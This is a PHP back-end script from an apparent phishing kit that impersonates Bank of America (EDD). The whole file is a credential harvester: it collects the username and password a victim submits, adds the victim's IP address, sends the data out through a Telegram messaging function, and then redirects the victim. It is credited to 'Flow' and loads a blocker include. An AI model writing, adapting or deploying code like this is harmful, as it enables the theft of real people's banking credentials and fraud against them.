<?php
include '../blocker.php';
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$message .= "Username Or Email Address: " .$_POST['username']."\n\n";
$message .= "Password Online: " .$_POST['pass']."\n\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "--------Made by-Flow------\n";
$subject = "Bank-OfAmerica-Edd-Username-And-Password\r\n\r\n".$message;
send_telegram_msg($message);
header("Location: __++--==.htm");


?>
        